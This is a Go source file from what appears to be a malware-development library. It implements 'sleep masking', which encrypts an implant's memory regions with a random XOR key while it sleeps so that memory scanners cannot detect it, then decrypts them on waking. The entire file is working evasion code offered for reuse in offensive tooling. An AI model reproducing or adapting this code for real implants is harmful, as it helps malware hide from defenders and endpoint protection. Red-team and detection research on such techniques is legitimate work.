// Package sleepmask provides encrypted sleep to defeat memory scanning.
// See docs/techniques/evasion/sleep-mask.md for the full treatment.
package sleepmask

import (
	"context"
	"crypto/rand"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/cleanup/memory"
)

// Mask coordinates encrypted sleep over a set of memory regions. The
// cipher (default: XORCipher/32 bytes) transforms the region bytes; the
// strategy (default: &InlineStrategy{}) controls the threading model
// of the encrypt/wait/decrypt cycle.
type Mask struct {
	regions  []Region
	cipher   Cipher
	strategy Strategy
}

// New builds a Mask over the given regions with default cipher + strategy.
func New(regions ...Region) *Mask {
	return &Mask{
		regions:  regions,
		cipher:   NewXORCipher(),
		strategy: &InlineStrategy{},
	}
}

// WithCipher overrides the cipher. nil reverts to the default XOR cipher.
func (m *Mask) WithCipher(c Cipher) *Mask {
	if c == nil {
		c = NewXORCipher()
	}
	m.cipher = c
	return m
}

// WithStrategy overrides the strategy. nil reverts to InlineStrategy.
func (m *Mask) WithStrategy(s Strategy) *Mask {
	if s == nil {
		s = &InlineStrategy{}
	}
	m.strategy = s
	return m
}

// Sleep performs one encrypt → wait → decrypt cycle. A fresh random key
// sized to m.cipher.KeySize() is drawn from crypto/rand and scrubbed
// via cleanup/memory.SecureZero after the cycle. Returns ctx.Err() if
// the wait was cancelled, the strategy's error on syscall failure, or
// nil on success. Zero regions or a non-positive d short-circuits.
func (m *Mask) Sleep(ctx context.Context, d time.Duration) error {
	if len(m.regions) == 0 || d <= 0 {
		return nil
	}
	key := make([]byte, m.cipher.KeySize())
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("sleepmask: key generation: %w", err)
	}
	defer memory.SecureZero(key)

	return m.strategy.Cycle(ctx, m.regions, m.cipher, key, d)
}
